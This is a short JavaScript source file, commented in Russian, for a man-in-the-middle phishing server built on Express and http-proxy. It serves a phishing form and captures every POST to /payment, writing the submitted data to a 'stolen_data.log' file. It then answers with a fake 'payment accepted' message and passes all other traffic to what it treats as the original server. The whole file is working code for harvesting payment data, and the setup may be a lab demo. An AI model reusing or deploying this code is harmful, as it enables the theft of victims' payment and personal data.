import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import httpProxy from 'http-proxy';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8081;
const proxy = httpProxy.createProxyServer({});

// Middleware для парсинга разных типов данных
app.use(express.json()); // для JSON
app.use(express.urlencoded({ extended: true })); // для form-urlencoded

// Создаем папку для логов
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

// Логируем все перехваченные данные
function logStolen(data) {
    console.log("🔥🔥🔥 ПЕРЕХВАЧЕНЫ ДАННЫЕ:", data);
    
    // Сохраняем в файл
    const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
    fs.appendFileSync(path.join(logDir, 'stolen_data.log'), logEntry);
}

// Статические файлы - отдаём фишинговую форму
app.use(express.static(path.join(__dirname, "public")));

// Перехватываем POST-запросы к /payment (обрабатываем оба формата)
app.post("/payment", (req, res) => {
    // Получаем данные из любого формата
    const data = req.body;
    
    // Перехватываем данные
    logStolen(data);
    
    // Отправляем фейковый ответ
    res.json({ 
        status: "success", 
        message: "Оплата принята"
    });
});

// Проксируем все остальные запросы к оригинальному серверу
app.use((req, res) => {
    console.log(`📡 MITM: Проксируем ${req.method} ${req.url}`);
    proxy.web(req, res, { 
        target: 'http://original:8080',
        changeOrigin: true 
    });
});

// Обработка ошибок прокси
proxy.on('error', (err, req, res) => {
    console.log('⚠️ Прокси ошибка:', err.message);
    res.status(500).send('Server error');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🎭 MITM-сервер → http://localhost:8081`);
});